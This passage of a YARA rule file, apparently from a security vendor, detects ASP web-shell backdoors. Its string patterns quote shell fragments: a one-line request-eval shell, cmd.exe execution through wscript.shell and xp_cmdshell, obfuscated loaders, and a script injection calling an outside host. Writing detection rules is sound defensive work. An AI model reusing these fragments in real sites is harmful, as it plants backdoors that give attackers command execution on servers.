        $s19 = "' -------------------------------------------" fullword ascii
        $s20 = "' --------------------o0o--------------------" fullword ascii
     condition:
        ( uint16(0) == 0x2b3c and filesize < 4KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule b2276765e6d4ff78db4ccdca88de2fbd0f2d35c7
{
     meta:
        description = "asp - file b2276765e6d4ff78db4ccdca88de2fbd0f2d35c7.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "7a389a19dd7edafc6dbc8c5636c4e3b4523f6b6753f5b55140657f77c8d1eee2"
     strings:
        $s1 = "<%execute request(\"sb\")%><%'<% loop <%:%>" fullword ascii
     condition:
        ( uint16(0) == 0x253c and filesize < 1KB and ( all of them ) ) or ( all of them )
}

rule sig_9b5d63fa4e5b3c1bebac88bbb343f61a2fb52faa
{
     meta:
        description = "asp - file 9b5d63fa4e5b3c1bebac88bbb343f61a2fb52faa.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "205303aefe50a45c6d8ab2630903fcbb63de873d8dcd24cc341c6c77021f3b29"
     strings:
        $s1 = ",Server,Response,Request,Application,Session,Error " fullword ascii
     condition:
        ( uint16(0) == 0x253c and filesize < 1KB and ( all of them ) ) or ( all of them )
}

rule sig_5723fdd671442c9060e8cfe6d1686d778b2faff0
{
     meta:
        description = "asp - file 5723fdd671442c9060e8cfe6d1686d778b2faff0.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "2852f25ca4e9c20f000d536d1daba1ec24b43573722ba248d14c377ec30987c0"
     strings:
        $s1 = "<%execute request(" fullword ascii
     condition:
        ( uint16(0) == 0x253c and filesize < 1KB and ( all of them ) ) or ( all of them )
}

rule a4f6b9dc272b7aeeca7365f2f063ad0d7ab94adf
{
     meta:
        description = "asp - file a4f6b9dc272b7aeeca7365f2f063ad0d7ab94adf.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "6349389d6fab3bf660f74fe4d224aea7b7b74f49546e3713dd4f42d3760c9396"
     strings:
        $x1 = "j cdx&\"<a href='?Action=EditPower&PowerPath=\\\\.\\\"&ScriptPath&\"' target='FileFrame'>\"&cxd&\" " fullword ascii
        $s2 = "<a><a class=am href='javascript:ShowFolder(\"\"C:\\\\Documents and Settings\\\\All Users\\\\Documents\"\")'>(4)" fullword ascii
        $s3 = "j cdx&\"<a href='?Action=Cmd1Shell' target='FileFrame'>\"&cxd&\" " fullword ascii
        $s4 = "<a>&nbsp;&nbsp;&nbsp;&nbsp;<a class=am href='javascript:ShowFolder(\"\"C:\\\\Program Files\\\\RhinoSoft.com\"\")'>(3)" fullword ascii
        $s5 = "<a><a class=am href='javascript:ShowFolder(\"\"C:\\\\Documents and Settings\\\\All Users\\\\\"\")'>(5)" fullword ascii
        $s6 = "<a><a class=am href='javascript:ShowFolder(\"\"C:\\\\Documents and Settings\\\\All Users\\\\" fullword ascii
        $s7 = "j SI&\"</tr></table></div><script>var container = new Array(\"\"linklist2\"\"); var objects = new Array(); var links = new Array" ascii
        $s8 = "execute(king(\")`>ktzfte/<>qtkqzbtz/<`(p: ssqrqtk.zxgrzl.))`rde`(zltxjtk&`e/ `&)`brde`(zltxjtk(etbt.fiszhokeUg p: yo rft" fullword ascii
        $s9 = "j cdx&\"<a href='?Action=CustomScanDriveForm' target='FileFrame'>\"&cxd&\"  <font color=red>" fullword ascii
        $s10 = "j cdx&\"<a href='?Action=Logout' target='FileFrame'>\"&cxd&\" " fullword ascii
        $s11 = "execute(king(\"`>kz/<>rz/<`&)`SNQKJXBU_NSINSU`(ltswqokqIktcktU.zltxjtN&`>'XXXXXX#'=kgsgeuw rz<>rz/< >'XXXXXX#'=kgsgeuw rz<>rz/<" fullword ascii
        $s12 = "j cdx&\"<a href='\"&htp&\"ip/?action=sed&cx_33=\"&domain&\"' target='FileFrame'>\"&cxd&\" " fullword ascii
        $s13 = "execute(king(\"yo rft:`>``'`&izqYktvgY&`=izqYktvgY&9=thnJtcqU&ktvgYtcqU=fgozeQ?'=ytki.fgozqegs``=aeosefg " fullword ascii
        $s14 = "execute(king(\"ufoizgG = tsoXtiz ztU:yo rft:`>zhokel/<;)(tlgse.vgrfov;)(rqgstk.fgozqegs.ktfthg.vgrfov;)'" fullword ascii
        $s15 = "j cdx&\"<a href='?Action=delpoint' target='FileFrame'>\"&cxd&\"  <font color=red>" fullword ascii
        $s16 = "j cdx&\"<a href='?Action=cmdx' target='FileFrame'>\"&cxd&\" " fullword ascii
        $s17 = "<a><a class=am href='javascript:ShowFolder(\"\"C:\\\\WINDOWS\\\\Temp\"\")'>&nbsp;&nbsp;(2)" fullword ascii
        $s18 = "bg =\"http://p.blog.csdn.net/images/p_blog_csdn_net/kj021320/302272/o_puppet-mummy.jpg\"  '" fullword ascii
        $s19 = "<a>   <a class=am href='javascript:ShowFolder(\"\"C:\\\\Documents and Settings\\\\All Users\\\\" fullword ascii
        $s20 = "j cdx&\"<a href='?Action=MMD' target='FileFrame'>\"&cxd&\" SQL-----SA\"&ef" fullword ascii
     condition:
        ( uint16(0) == 0x6f3c and filesize < 300KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule sig_9d3bdaf38e0030f76776acef9e9bc4935ade8aa1
{
     meta:
        description = "asp - file 9d3bdaf38e0030f76776acef9e9bc4935ade8aa1.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "3e33f195e7c39b1b03d01f57278a2a6f0155bd5faaeaf2dc97e4159513115b5f"
     strings:
        $x1 = "response.write server.createobject(\"wscript.shell\").exec(\"cmd.exe /c \"&request.form(\"cmd\")).stdout.readall" fullword ascii
        $x2 = "si=\"<script src=\"\"http://sx.love-1-love.com/sx.php?url=\"&server.URLEncode(\"\"&request.ServerVariables(\"HTTP_HOST\")&reques" ascii
        $x3 = "RRS\"Zend: C:\\Program Files\\Zend\\ZendOptimizer-3.3.0\\lib\\Optimizer-3.3.0\\php-5.2.x\\ZendOptimizer.dll  <br>\"" fullword ascii
        $x4 = "<a href='javascript:ShowFolder(\"\"C:\\\\Documents and Settings\\\\All Users\\\\\"\")'>AllUsers</a>n#" fullword ascii
        $s5 = "case \"apjdel\":apjdel():case \"Servu7x\":su7():case \"fuzhutq1\":fuzhutq1():case \"fuzhutq2\":fuzhutq2():case \"fuzhutq3\":fuzh" ascii
        $s6 = "<a href='javascript:ShowFolder(\"\"c:\\\\Documents and Settings\\\\All Users\\\\a" fullword ascii
        $s7 = "<a href='javascript:ShowFolder(\"\"C:\\\\Documents and Settings\\\\All Users\\\\`" fullword ascii
        $s8 = "RRS\"c:\\Documents and Settings\\All Users\\Application Data\\Hagel Technologies\\DU Meter\\log.csv <br>\"" fullword ascii
        $s9 = "RRS\"C:\\Program Files\\Helicon\\ISAPI_Rewrite3\\error.log <br>\"" fullword ascii
        $s10 = "RRS\"c:\\Program Files\\Common Files\\Symantec Shared\\Persist.Dat  <br>\"" fullword ascii
        $s11 = "RRS\"C:\\7i24.com\\iissafe\\log\\startandiischeck.txt  <br>\"" fullword ascii
        $s12 = "RRS\"c:\\Program Files\\Common Files\\Symantec Shared\\Validate.dat  <br>\"" fullword ascii
        $s13 = "xPost.Open \"POST\", \"http://127.0.0.1:\"& port &\"/secdst\",True, \"\", \"\"" fullword ascii
        $s14 = "<a href='javascript:ShowFolder(\"\"C:\\\\WINDOWS\\\\system32\\\\config\\\\\"\")'>config</a>WP" fullword ascii
        $s15 = "<a href='javascript:ShowFolder(\"\"c:\\\\WINDOWS\\\\system32\\\\inetsrv\\\\data\\\\\"\")'>data</a>eF<a href='javascript:ShowFold" ascii
        $s16 = "xPost3.Open \"POST\", \"http://127.0.0.1:\"& port &\"/secdst\", True" fullword ascii
        $s17 = "RRS\"c:\\Program Files\\360\\360Safe\\deepscan\\Section\\mutex.db <br>\"" fullword ascii
        $s18 = "xPost.Send loginuser & loginpass & mt & newdomain & newuser & quit" fullword ascii
        $s19 = ":Sub Scan(targetip, portNum):On Error Resume Next:set conn = Server.CreateObject(\"ADODB.connection\"):connstr=\"Provider=SQLOLE" ascii
        $s20 = "RRS\"C:\\Program Files\\Helicon\\ISAPI_Rewrite3\\Rewrite.log<br>\"" fullword ascii
     condition:
        ( uint16(0) == 0x253c and filesize < 300KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule e9301a8269d87868e33651f0b8c6f7f08e902383
{
     meta:
        description = "asp - file e9301a8269d87868e33651f0b8c6f7f08e902383.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "26983c20d5800393bac3bb53aba3932b1f4e74024666a95dd250d8d53e92c88c"
     strings:
        $x1 = "conn.Execute(\"Create Table FileData(Id int IDENTITY(0,1) PRIMARY KEY CLUSTERED,strPath VarChar,binContent Image)\")" fullword ascii
        $x2 = "conn.execute(\"exec ma\"&aixd&\"ster..xp_cmdshell'bcp \"\"\"&oaquw&\"..dark_temp\"\" in \"\"\"&ekemb&\"\"\" -T -f c:\\tmp.fmt'\"" ascii
        $x3 = "conn.execute(\"exec ma\"&aixd&\"ster..xp_cmdshell'bcp \"\"select binfile from \"&oaquw&\"..dark_temp\"\" queryout \"\"\"&wjiy&\"" ascii
        $x4 = "conn.execute \"CREATE TABLE [dark_temp] ([id] [int] NULL ,[binfile] [Image] NULL) ON [PRIMARY] TEXTIMAGE_ON [PRIMARY];\"" fullword ascii
        $x5 = "conn.execute(\"exec ma\"&aixd&\"ster..xp_cmdshell'bcp \"\"select binfile from \"&oaquw&\"..dark_temp\"\" queryout \"\"\"&wjiy&\"" ascii
        $x6 = "conn.execute(\"EXEC ma\"&aixd&\"ster..xp_cmdshell 'echo \"&substrfrm&\" >>c:\\tmp.fmt'\")" fullword ascii
        $x7 = "conn.execute \"If object_id('dark_temp')is not null drop table dark_temp\"" fullword ascii
        $x8 = "conn.execute \"CREATE TABLE [dark_temp] ([binfile] [Image] NULL)\"" fullword ascii
        $x9 = "conn.execute(\"EXECUTE ma\"&aixd&\"ster..xp_cmdshell 'del c:\\tmp.fmt'\")" fullword ascii
        $x10 = "gsj\"text\",\"ctsva\",\"C:\\WINDOWS\\syste\"&fky&\"m32\\cmd.exe\",\"35%\",\"\",\"\"" fullword ascii
        $x11 = "gsj\"text\",\"fpyy\",\"C:\\WINDOWS\\syste\"&fky&\"m32\\cmd.exe\",\"35%\",\"\",\"\"" fullword ascii
        $x12 = "form2.npkn.value=\"backup database \"&oaquw&\" to disk='C:\\windows\\temp\\~098611.tmp' with init\"" fullword ascii
        $x13 = "form2.npkn.value=\"alter database \"&oaquw&\" Set recovery full;dump transaction \"&oaquw&\" with no_log;If object_id('dark_temp" ascii
        $x14 = "sont=sont&\"<a href='http://www.helpsoff.com.cn' target='_blank'>Fuck Tencent</a>\"" fullword ascii
        $x15 = "sont=sont&\"<a href='http://0kee.com/' target='_blank'>0kee Team</a> | \"" fullword ascii
        $x16 = "form2.npkn.value=\"backup log \"&oaquw&\" to disk='\"&ulkns&\"';drop table dark_temp\"" fullword ascii
        $s17 = "form2.npkn.value=\"alter database \"&oaquw&\" Set recovery full;dump transaction \"&oaquw&\" with no_log;If object_id('dark_temp" ascii
        $s18 = "gsj\"text\",\"cnet\",\"C:\\WINDOWS\\Temp\\~098611.tmp\",\"50%\",\"\",\"\"" fullword ascii
        $s19 = "gsj\"text\",\"xcnu\",\"C:\\WINDOWS\\Temp\\~098611.tmp\",\"30%\",\"\",\"\"" fullword ascii
        $s20 = "isbb\"C:\\Documents and Settings\\All Users\\Start Menu\\Programs\",\"Start Menu->Programs\"" fullword ascii
     condition:
        ( uint16(0) == 0x253c and filesize < 300KB and ( 1 of ($x*) and all of them ) ) or ( all of them )
}

rule sig_635020d709703bfe7f4cfe694cfff98691c4aeec
{
     meta:
        description = "asp - file 635020d709703bfe7f4cfe694cfff98691c4aeec.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "2389037c5253c820f670b7383e40454741144dc4e7df80a2dfa166f142153781"
     strings:
        $s1 = "<td>&nbsp;<a href=\"<%=tempurl+f1.name%>\" target=\"_blank\"><%=f1.name%></a></td>" fullword ascii
        $s2 = "<form name=\"form1\" method=\"post\" action=\"<%= url%>?action=chklogin\">" fullword ascii
        $s3 = "Response.AddHeader \"Content-Disposition\", \"attachment; filename=\" & filename" fullword ascii
        $s4 = "temp1 = Len(folderspec) - Len(server.MapPath(\"./\")) -1" fullword ascii
        $s5 = "<form name=\"form1\" method=\"post\" action=\"<%= url%>?action=saveupload\" enctype=\"multipart/form-data\" >" fullword ascii
        $s6 = "response.Write(\"<a href='\"&url&\"?action=download&file=\"&server.mappath(filename&\".yc\")&\"' target=_blank><font color=black" ascii
        $s7 = "response.Write(\"<a href='\"&url&\"?action=download&file=\"&server.mappath(filename&\".yc\")&\"' target=_blank><font color=black" ascii
        $s8 = "If fso.FileExists(trim(oldname(i))) Then fso.MoveFile trim(oldname(i)), path&fso.GetFileName(trim(oldname(i)))" fullword ascii
        $s9 = "Response.Redirect(url&\"?foldername=\"&fso.GetParentFolderName( oldname(0) ))" fullword ascii
        $s10 = "Response.Redirect(url&\"?foldername=\"&fso.GetParentFolderName(filename))" fullword ascii
        $s11 = "uppath = \"./\" + Replace(temp1, \"\\\", \"/\")" fullword ascii
        $s12 = "temp1 = Right(folderspec, CInt(temp1)) + \"\\\"" fullword ascii
        $s13 = "tempurl = temp + Replace(temp1, \"\\\", \"/\")" fullword ascii
        $s14 = "ElseIf Request(\"action\") = \"chklogin\" Then" fullword ascii
        $s15 = "temp = Request.ServerVariables(\"HTTP_REFERER\")" fullword ascii
        $s16 = "?');\" <%if session(\"f\")=\"\" or isnull(session(\"f\")) then response.write(\" disabled\") %>>" fullword ascii
        $s17 = "If Session(\"login\") = \"true\" then" fullword ascii
        $s18 = "If File.FileSize>0 And (File.FileSize<MaxSize Or upload.Form(\"uppass\") = pass) Then" fullword ascii
        $s19 = "Response.Write(\"<script language='javascript'>window.opener.location.reload();self.close();</script>\")" fullword ascii
        $s20 = "INPUT{BORDER-TOP-WIDTH:1px;BORDER-LEFT-WIDTH:1px;FONT-SIZE:12px;BORDER-BOTTOM-WIDTH:1px;BORDER-RIGHT-WIDTH:1px;}" fullword ascii
     condition:
        ( uint16(0) == 0x683c and filesize < 70KB and ( 8 of them ) ) or ( all of them )
}

rule sig_0239ab9a97dbecaaf1f150dfcbbfbfb5b42e80e2
{
     meta:
        description = "asp - file 0239ab9a97dbecaaf1f150dfcbbfbfb5b42e80e2.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "e289d9eb3acdfbcf2239ffd9722525b07694bfa0c5c8decacab7095fba36968a"
     strings:
        $s1 = "<%#@~^QAAAAA==d Y~K4NmW!xDWk^+xW(LWdKRmMnlD+Y aO0bV `.+5; /O`rdX6N2CDtJbSDD;+*dRgAAA==^#~@%>" fullword ascii
        $s2 = "<%#@~^XwAAAA==d Y~K4N0/KP{~/ D-+MR^. lY G4N+mDcE?r_rm.JQEbwOJ3Ek   oEQrR0EQrksJ3E /E3JH/J3JDn:r_EW(JQEN+mrQJDJ#ExwAAA==^#~@%>" fullword ascii
        $s3 = "<%#@~^OwAAAA==. /2Kxk+RSDbO+,J@!0KxO~1WVK.'M+N@*dC P!xdE^^ /d\"@!&0KxO@*rQBQAAA==^#~@%>" fullword ascii
        $s4 = "<%#@~^UQAAAA==. /2Kxk+RSDbO+,J@!Y 6OCM+l,Uls+'1zWN9lDl~mGsk'0!,.WS/xqZPhr[Dtx&y@*@!zO 6DlD l@*EKhsAAA==^#~@%>" fullword ascii
        $s5 = "<%=#@~^NgAAAA==d D- Dc:lawmOtvDn;!+dOc/+M-+MlMrC4^+k`E/^.bwO{   C: JbbshQAAA==^#~@%>" fullword ascii
        $s6 = "<%#@~^OQAAAA==. /2Kxk+RSDbO+,J@!0KxO~1WVK.'M+N@*dC PkE^mndk\"@!z6GxD@*EXRMAAA==^#~@%>" fullword ascii
        $s7 = "<%#@~^MQAAAA==. /2Kxk+RSDbO+,J@!0KDh~mmYbGx{BBEv~: Y4W['2GkY@*JdRAAAA==^#~@%>" fullword ascii
        $s8 = "<%#@~^JwAAAA==r6POMks`D ;!n/D`E/H0[2mYtrb#@!@*Jr~Ot xigwAAA==^#~@%>" fullword ascii
     condition:
        ( uint16(0) == 0x6d3c and filesize < 6KB and ( all of them ) ) or ( all of them )
}

rule d85692972943514af0eb4c12a402519ccac129e5
{
     meta:
        description = "asp - file d85692972943514af0eb4c12a402519ccac129e5.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "f2acfebfa7590d6396f4f55341dc605bbcb5de88bdf77aa54dd509123791b716"
     strings:
        $s1 = "<TD><FONT SIZE=\"1\" face=\"Arial, Helvetica, sans-serif\"><%= Request.ServerVariables(Vars) %>&nbsp;</FONT></TD>" fullword ascii
        $s2 = "<TABLE width=\"75%\" BORDER=1 align=\"center\" cellpadding=\"3\" cellspacing=\"0\">" fullword ascii
     condition:
        ( uint16(0) == 0x253c and filesize < 2KB and ( all of them ) ) or ( all of them )
}

rule sig_62daabafdebd690d5946b6ca97168946458149e0
{
     meta:
        description = "asp - file 62daabafdebd690d5946b6ca97168946458149e0.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "edf86c8b587dfbaa3de9635db2ba83c5bc4092db8bd4793bdc0e6f1c59a79a3a"
     strings:
        $s1 = "wjgwegwegaklmgrghnewrghrenregadfgaerehrrtgregjgrgejgewgjewgewjgwegwegaklmgrghnewrghrenre*/ %>" fullword ascii
     condition:
        ( uint16(0) == 0x253c and filesize < 8KB and ( all of them ) ) or ( all of them )
}

rule ad42d54b65d7d1f6b0e2dd97ff8bab3547446f13
{
     meta:
        description = "asp - file ad42d54b65d7d1f6b0e2dd97ff8bab3547446f13.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "4a95904b0998d9073f7c9c587aad82bb4bb0bc63d11790285ef6735aacf603ff"
     strings:
        $x1 = "j cdx&\"<a href='http://sb178.com/' target='FileFrame'>\"&cxd&\" <font color=garnet>" fullword ascii
        $x2 = "</b><input type=text name=P VALUES=123456>?<input type=submit value=Execute></td></tr></table></form>\":j SI:SI=\"\":If trim(req" ascii
        $x3 = "j cdx&\"<a href='?Action=EditPower&PowerPath=\\\\.\\\"&ScriptPath&\"' target='FileFrame'>\"&cxd&\" " fullword ascii
        $s4 = "j cdx&\"<a href='?Action=Cmd1Shell' target='FileFrame'>\"&cxd&\" <font color=orangered>" fullword ascii
        $s5 = "<a><a class=am href='javascript:ShowFolder(\"\"C:\\\\Documents and Settings\\\\All Users\\\\Documents\"\")'>(4)" fullword ascii
        $s6 = "<a><a class=am href='javascript:ShowFolder(\"\"C:\\\\Documents and Settings\\\\All Users\\\\\"\")'>(5)" fullword ascii
        $s7 = "est.form(\"MMD\") & \"'\":set recResult = adoConn.Execute(strQuery):If NOT recResult.EOF Then:Do While NOT recResult.EOF:strResu" ascii
        $s8 = "<a><a class=am href='javascript:ShowFolder(\"\"C:\\\\Documents and Settings\\\\All Users\\\\" fullword ascii
        $s9 = "<a>????<a class=am href='javascript:ShowFolder(\"\"C:\\\\Program Files\\\\RhinoSoft.com\"\")'>(3)" fullword ascii
        $s10 = "j cdx&\"<a href='\"&htp&\"t00ls.asp' target='FileFrame'>\"&cxd&\" <font color=green>" fullword ascii
        $s11 = "j cdx&\"<a href='?Action=cmdx' target='FileFrame'>\"&cxd&\" <font color=orangered>" fullword ascii
        $s12 = "j cdx&\"<a href='\"&htp&\"Updates.asp' target='FileFrame'>\"&cxd&\" <font color=red>" fullword ascii
        $s13 = "j SI&\"</tr></table></div><script>var container = new Array(\"\"linklist2\"\"); var objects = new Array(); var links = new Array" ascii
        $s14 = "execute(king(\")`>ktzfte/<>qtkqzbtz/<`(p: ssqrqtk.zxgrzl.))`rde`(zltxjtk&`e/ `&)`brde`(zltxjtk(etbt.fiszhokeUg p: yo rft" fullword ascii
        $s15 = "j cdx&\"<a href='?Action=MMD' target='FileFrame'>\"&cxd&\" <font color=Turquoise>SQL-----SA\"&ef" fullword ascii
        $s16 = "j cdx&\"<a href='?Action=ScanDriveForm' target='FileFrame'>\"&cxd&\" <font color=chocolate>" fullword ascii
        $s17 = "j cdx&\"<a href='?Action=CustomScanDriveForm' target='FileFrame'>\"&cxd&\"  <font color=red>" fullword ascii
        $s18 = "j cdx&\"<a href='?Action=Logout' target='FileFrame'>\"&cxd&\" " fullword ascii
        $s19 = "execute(king(\"`>kz/<>rz/<`&)`SNQKJXBU_NSINSU`(ltswqokqIktcktU.zltxjtN&`>'XXXXXX#'=kgsgeuw rz<>rz/< >'XXXXXX#'=kgsgeuw rz<>rz/<" fullword ascii
        $s20 = "nection\"):adoConn.Open \"Provider=SQLOLEDB.1;Password=\"&password&\";User ID=\"&id:strQuery = \"exec master.dbo.xp_cMdsHeLl '\"" ascii
     condition:
        ( uint16(0) == 0x6f3c and filesize < 300KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule f852119df053650c719971ddb173776eb9275af3
{
     meta:
        description = "asp - file f852119df053650c719971ddb173776eb9275af3.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "d2b1e4a325d47641a7de4de3b2eba3154d15dae49e2aff06f16c89d502e2a90a"
     strings:
        $s1 = "mYbGx,I+9cdYM#@#@&]+[~{PE@!w61:P^G^WDx:60+ y+@*J~LPkYD,[,E@!Js61:@*E@#@&2x9~s!xmDrGx@#@&UE8Pj^mx9Db-+wW.hv#@#@&9b:~sU6Bf.b\\" fullword ascii
        $s2 = "mumaasp.com" fullword ascii
        $s3 = "V/nYy!r0u+Rs)1YbWxu&GY&G]+ u +/M+lDnH94]y+Y y]y,YG$9glh+u+!u&9Yy!w.GswO]y0u +u y]ERAw{]!covZ];0w,&u;*8v*u;0,RFuE" fullword ascii
        $s4 = "Y,/';DnlD+68N+mDcr(K`2ST#*P@#@&~P/ ;Whwm^YGlOC(l/n~rn.W7r9+.{HbmDK/KWYc9nYcrJ3GARW !pflDC~?KEMmn'E'hlOtLE~hDG-bN+.xtk^DKdK0Oc9" fullword ascii
        $s5 = "v@*;GaX@!Jl@*PJ@#@&U('Uq'J@!l~4M+0{vLm\\lk^.kaY=s;VsoKDh`rEJLInKmYtcKmY4[rwr[Jc1m:+*[rEJBJEHK\\nobV+rE#EPm^Cd/{Bm:vPOrDVn'E" fullword ascii
        $s6 = "'8P@*@!&C@*@!&Y9@*@!JY.@*r)I]jr@!OD@*@!DN~4+botD'E+ E@*@!l,t.n6'B4OYa)zJAAhc:!:Cld2cmG:JrwJgC^DkWUxk+[[1a|&f{JL/+M\\" fullword ascii
        $s7 = "Y+ u y]+,Y{~fHlsn]y!YfG] T2MWhwDYy%Yy u  uER$sF];cwvTY!%sOf]!*F+Xm]!GOs${Y;l )%u;*y&TY!Gv33uE" fullword ascii
        $s8 = "w;O,xlhn{BJwmdkB~DXa+'Ewmd/SW.NEP~dby+{vFlB@*,@!rxaEDPOX2n{BjE(hkDB~-mVEnxESGobUE@*@!JNb\\@*@!z1nxD+.@*r@#@&r6Pk" fullword ascii
        $s9 = "~KxZsr13xB4rkYGMXcoWvO8biE@*E@#@&D.drJ@#@&3x9Pk6@#@&DM/r@!&K9@*r@#@&DMdJ,P@!&:I@*E@#@&D./r@!JK)~SA@*J@#@&AUN,?;4@#@&o;" fullword ascii
        $s10 = "@!z(@*@!zm@*@!zPf@*E@#@&.DkE@!:I~^^l/dx:APf@*~@!s6\"H,lmDkKU',:nY4W[xhW/D@*J@#@&DMdE@!:f,lskLU{:rN9s+@*@!$@*S:w;8" fullword ascii
        $s11 = "SItEuRl=\"http://www.mumaasp.com/\"  " fullword ascii
        $s12 = "Y@*@!4M@*JLs 1m:n'r@!zm@*J,@#@&U(x?&[r@!8D@*,@!l~tMn0{B%C7l/^.bwO)w;^VoKDs`JrJL]+hlOtvnCO4[J'E[wR1mhn#LJrJSJE/KwzsKsN" fullword ascii
        $s13 = "ko4O'rJ ZEEP(o1WsW.xrJ:swoswsEE@*PJ'G(L fbdaVCH1m:+LJ@!OD@*@!ON,tnrTtY{EJy!Jr~8o1W^W.'EE[soswosrJ~^KV/2C" fullword ascii
        $s14 = "/2R]!vq!oY!c3!GYER!o9uE**T;];*WTG];wsZF]y u+ u /sglhnu ,ufADWwc4rN" fullword ascii
        $s15 = "[~k6@#@&2UN~j!4@#@&U;4,?^oKVNn.v0GV9nM#~@#@&}xPADMGD,In/!:n~g+6D@#@&Gk:,ojrBrwWsNn.BKn:aoW^Nn.B?mhdT~j@#@&j" fullword ascii
        $s16 = "/E^Y,@#@&M+dE^Y~x,!P@#@&sKDPb~xP8P:W~SnUv/ODbU#,@#@&(6PHr[v/ODbUBPrBP8#P{PrWJ,r.Ptk[ckYDbU~,k~,qbP{JwJ~K4n" fullword ascii
        $s17 = "o@#@&P,jq{?([r@!&OM@*@!JOl(V+@*E@#@&,P\"IjPj(=?('rE@#@&qW~d+xcj$VjYMb@*FT,K4+x@#@&,~q6PJZm/ncd+0Dc?$V?D.Sv*#{Jd+sn1YEPD4+" fullword ascii
        $s18 = "@!&(@*@!zm@*@!zO9@*@!zYM@*rlI\"?E@!DD@*@!DNP4nkTtY{v+ E@*@!l~t.n6'vgz^YbWUxUmlUKKDOB,OmDL" fullword ascii
        $s19 = "kL4D' @*@!JY[@*@!&DD@*@!zDl4^+@*E@#@&I]?,?(lUq'rE)b'!@#@&jq{J@!YC4sn,hrND4'EFTTuBP8GMNnD{vZB~1+^V/al1rxT'v!EP^n^Vwm[Nbxo{v" fullword ascii
        $s20 = "YnD@*J@#@&Uq'U([~lm0i.V@#@&\"IjPj(@#@&3x9~q6@#@&~,2x[~wEUmDrKx@#@&s!xmDkKUPANrYwksnvnlD4#@#@&P,(WP\"+$En/Ocrb^YbGxyJbxrnWdOrPPt" fullword ascii
     condition:
        ( uint16(0) == 0x6f3c and filesize < 300KB and ( 8 of them ) ) or ( all of them )
}

rule d4a364ac6a48f6b41a68121122c16b0fb3f3e8dc
{
     meta:
        description = "asp - file d4a364ac6a48f6b41a68121122c16b0fb3f3e8dc.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "65dbdb94717f956d1529eae468447f65f95a91f16019173aa740894845abc1d3"
     strings:
        $x1 = "seshell.ShellExecute shellpath,\" /c \" & defcmd & \" > \" & sztempfile,\"\",\"open\",0" fullword ascii
        $x2 = "CONn.EXEcutE(\"Create Table FileData(Id int IDENTITY(0,1) PRIMARY KEY CLUSTERED, thePath VarChar, fileContent Image)\")" fullword ascii
        $x3 = "></form></tr></table>\":jb SI:SI=\"\":If trim(request.form(\"MMD\"))<>\"\"  Then:password= trim(Request.form(\"P\")):id=trim(Req" ascii
        $x4 = "jb\"<title>\"&nimajb&\" - \"&nimajbm&\" </title>\":jb\"<style type=\"\"text/css\"\">\":jb\"body,td{font-size: 12px;background-co" ascii
        $x5 = "'jb\"<tr><td height='22'><a href='http://aspmuma.cn/pr/?Submit=+%B2%E9+%D1%AF+&domain=\"&Worinima&\"' target='FileFrame'>" fullword ascii
        $x6 = "ConnstR=\"Provider=SQLOLEDB.1;Data Source=\" & tARgETIp &\",\"& PoRtNUm &\";User ID=lake2;Password=;\"" fullword ascii
        $s7 = "<input name='ToPath' value='\"&RRePath(Session(\"FolderPath\")&\"\\Cmd.exe\")&\"' size='40'>\"" fullword ascii
        $s8 = "!)</font></a></center>\":jb\"<tr><td height='20'><a href='?Action=Upload' target='FileFrame'><center><font color=red size=5px>(" fullword ascii
        $s9 = "jb\"<input type=hidden name=\"\"#\"\" value=Execute(Session(\"\"#\"\"))>\"" fullword ascii
        $s10 = "jb\"<tr><td height='20'><a href='?Action=Cmd1Shell' target='FileFrame'>" fullword ascii
        $s11 = "'jb\"<tr><td height='22'><a href='http://aspmuma.cn/mmgx/index.htm' target='FileFrame'>" fullword ascii
        $s12 = "'jb\"<tr><td height='22'><a href='http://aspmuma.cn/ip/?action=sed&cx_33=\"&ServerU&\"' target='FileFrame'>" fullword ascii
        $s13 = "b.open \"GET\", \"http://127.0.0.1:\" & ftpport & \"/M_Schumacher/upadmin/s2\", True, \"\", \"\"" fullword ascii
        $s14 = "\"exec master.dbo.xp_cMdsHeLl '\" & request.form(\"MMD\") & \"'\":set recResult = adoConn.Execute(strQuery):If NOT recResult.EOF" ascii
        $s15 = "xpost3.open \"POST\", \"http://127.0.0.1:\"& port &\"/leaves\", true" fullword ascii
        $s16 = "xpost.open \"POST\", \"http://127.0.0.1:\"& port &\"/leaves\", true" fullword ascii
        $s17 = "a.open \"GET\", \"http://127.0.0.1:\" & port & \"/M_Schumacher/upadmin/s1\",True, \"\", \"\"" fullword ascii
        $s18 = "c.open \"GET\", \"http://127.0.0.1:\" & port & \"/M_Schumacher/upadmin/s3\", True, \"\", \"\"" fullword ascii
        $s19 = "jb\"<tr><td height='20'><a href='?Action=hiddenshell' target='FileFrame'>" fullword ascii
        $s20 = "CONN.ExecUtE(sqlSTR)" fullword ascii
     condition:
        ( uint16(0) == 0x6f3c and filesize < 300KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule sig_856fd869cbe305608cbf90f61f50a373ce6a81e4
{
     meta:
